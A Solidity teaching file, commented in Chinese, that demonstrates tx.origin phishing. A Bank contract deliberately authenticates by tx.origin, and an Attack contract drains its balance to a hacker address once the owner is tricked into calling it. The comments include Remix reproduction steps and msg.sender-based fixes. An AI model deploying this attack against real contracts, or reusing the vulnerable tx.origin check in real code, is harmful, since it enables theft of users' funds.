// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
	tx.origin钓鱼攻击
	在solidity中, 使用tx.origin可以获得启动交易的原始地址, 它与msg.sender
	十分相似;
	如果用户A调用了B合约, 再通过B合约调用了C合约, 那么在C合约看来, 
	msg.sender就是B合约, 而tx.origin就是用户A; 因此如果一个银行合约使
	用了tx.origin做身份认证, 那么黑客就有可能先部署一个攻击合约, 然后
	再诱导银行合约的拥有者调用, 即使msg.sender是攻击合约地址, 但
	tx.origin是银行合约拥有者地址, 那么转账就有可能成功


	Remix 复现:
	1. 先将value设置为10ETH, 再部署 Bank 合约, 拥有者地址 owner 被初始化为部
		署合约地址
	2. 切换到另一个钱包作为黑客钱包, 填入要攻击的银行合约地址, 再部署 Attack 
		合约, 黑客地址 hacker 被初始化为部署合约地址
	3. 切换回owner地址, 调用Attack合约的attack()函数, 可以看到Bank合约余额
		被掏空了, 同时黑客地址多了10ETH

	预防:
	1. 使用 msg.sender代替 tx.origin
		msg.sender能够获取直接调用当前合约的调用发送者地址, 通过对msg.sender
		的检验, 就可以避免整个调用过程中混入外部攻击合约对当前合约的调用
	2. 检验tx.origin == msg.sender
		如果一定要使用tx.origin, 可以再检验tx.origin是否等于msg.sender, 这样
		可以避免整个调用过程中混入外部攻击合约对当前合约的调用, 但是副作用
		是其他合约将不能调用这个函数
*/

contract Bank {
    address public owner;//记录合约的拥有者

    //在创建合约时给 owner 变量赋值
    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        // 检查消息来源 
		// 可能owner会被诱导调用该函数, 有钓鱼风险!
        require(tx.origin == owner, "Not owner");
        // 转账ETH
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    // 受益者地址
    address payable public hacker;
    // Bank合约地址
    Bank bank;

    constructor(Bank _bank) {
        // 强制将address类型的_bank转换为Bank类型
        bank = Bank(_bank);
        // 将受益者地址赋值为部署者地址
        hacker = payable(msg.sender);
    }

    function attack() public {
        // 诱导bank合约的owner调用, 于是bank合约内的余额就全部转移到黑客地址中
        bank.transfer(hacker, address(bank).balance);
    }
}
